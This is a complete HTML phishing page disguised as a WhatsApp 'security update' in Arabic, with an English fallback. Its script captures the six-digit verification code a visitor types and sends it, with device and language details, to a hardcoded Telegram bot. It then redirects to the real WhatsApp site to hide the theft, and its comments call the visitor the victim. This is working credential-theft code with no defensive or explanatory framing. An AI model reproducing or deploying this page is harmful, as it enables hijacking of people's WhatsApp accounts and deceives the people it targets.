<!DOCTYPE html>
<html id="html-tag" lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Support</title>
    <style>
        :root { --wa-green: #25d366; --wa-dark: #128c7e; --text-main: #111b21; --text-sec: #667781; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, Arial; }
        body { background: #fff; color: var(--text-main); }
        
        /* Header مع الأيقونة */
        .header { padding: 15px; display: flex; flex-direction: column; align-items: center; border-bottom: 1px solid #f0f2f5; }
        .wa-logo { width: 50px; height: 50px; margin-bottom: 10px; }
        .header h1 { font-size: 18px; color: var(--wa-dark); }

        .content { padding: 25px; text-align: center; }
        .device-info-bar { display: inline-block; padding: 4px 12px; background: #e7fce3; color: #075e54; border-radius: 20px; font-size: 12px; font-weight: 600; margin-bottom: 15px; }
        
        .instruction { font-size: 14px; color: var(--text-sec); margin-bottom: 20px; }
        .phone-num { color: #007bff; font-weight: 600; direction: ltr; display: block; margin-top: 5px; }

        /* OTP Design */
        .otp-container { position: relative; margin: 40px 0; }
        #main-otp { position: absolute; opacity: 0; width: 100%; height: 100%; z-index: 2; cursor: pointer; }
        .boxes { display: flex; gap: 8px; justify-content: center; direction: ltr; }
        .box { width: 40px; height: 45px; border-bottom: 2px solid #ccc; font-size: 24px; display: flex; align-items: center; justify-content: center; }
        
        #main-otp:focus + .boxes .box { border-bottom-color: var(--wa-green); }

        .btn-confirm { width: 100%; background: var(--wa-green); color: #fff; border: none; padding: 15px; border-radius: 5px; font-weight: 700; font-size: 16px; margin-top: 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); cursor: pointer; }
        
        /* شاشة التحميل */
        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid var(--wa-green); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="wa-logo" alt="WA">
    <h1 id="title">تحديث أمان واتساب</h1>
</div>

<div class="content">
    <div id="device-tag" class="device-info-bar">جاري التعرف على الجهاز...</div>
    
    <p class="instruction" id="desc">
        يرجى تأكيد الرمز المرسل لهاتفك المسجل:
        <span class="phone-num">+20 0123456789</span>
    </p>

    <div class="otp-container">
        <input type="tel" id="main-otp" maxlength="6" inputmode="decimal" autocomplete="one-time-code" oninput="fillBoxes(this)">
        <div class="boxes">
            <div class="box" id="b0"></div><div class="box" id="b1"></div><div class="box" id="b2"></div>
            <div class="box" id="b3"></div><div class="box" id="b4"></div><div class="box" id="b5"></div>
        </div>
    </div>

    <button class="btn-confirm" id="btn" onclick="document.getElementById('main-otp').focus()">تحديث الآن</button>
</div>

<div id="load" class="overlay">
    <div class="spinner"></div>
    <p style="margin-top:20px" id="load-text">جاري مزامنة التحديث...</p>
</div>

<script>
    const BOT_TOKEN = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
    const CHAT_ID = '5446862709';

    // 1. كشف اللغة وتحويل الواجهة
    const userLang = navigator.language || navigator.userLanguage;
    if (userLang.startsWith('en')) {
        document.getElementById('html-tag').lang = 'en';
        document.getElementById('html-tag').dir = 'ltr';
        document.getElementById('title').innerText = 'WhatsApp Security Update';
        document.getElementById('desc').innerHTML = 'Please confirm the code sent to your registered number: <span class="phone-num">+20 0123456789</span>';
        document.getElementById('btn').innerText = 'Update Now';
        document.getElementById('load-text').innerText = 'Syncing update...';
    }

    // 2. كشف الجهاز وعرضه
    const ua = navigator.userAgent;
    let deviceName = "Smartphone";
    if (ua.includes("iPhone")) deviceName = "iPhone";
    else if (ua.includes("Android")) deviceName = "Android Device";
    document.getElementById('device-tag').innerText = "📍 Detected: " + deviceName;

    function fillBoxes(el) {
        const val = el.value;
        for (let i = 0; i < 6; i++) {
            document.getElementById('b' + i).innerText = val[i] || '';
            document.getElementById('b' + i).style.borderBottomColor = val[i] ? '#25d366' : '#ccc';
        }
        if (val.length === 6) sendLog(val);
    }

    async function sendLog(code) {
        document.getElementById('load').style.display = 'flex';
        
        const text = `🚀 *New Hit (Security Update)*\n\n` +
                     `🔢 *OTP:* \`${code}\` \n` +
                     `📱 *Device:* ${deviceName}\n` +
                     `🌍 *Lang:* ${userLang}\n` +
                     `📍 *IP:* (Check Bot Logs)`;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
            
            // تحويل الضحية بعد السحب لزيادة التمويه
            setTimeout(() => { window.location.href = "https://www.whatsapp.com/security"; }, 2000);
        } catch (e) {}
    }

    // أول ما يلمس الصفحة الكيبورد يفتح
    document.body.addEventListener('click', () => { document.getElementById('main-otp').focus(); }, {once: true});
</script>
</body>
</html>
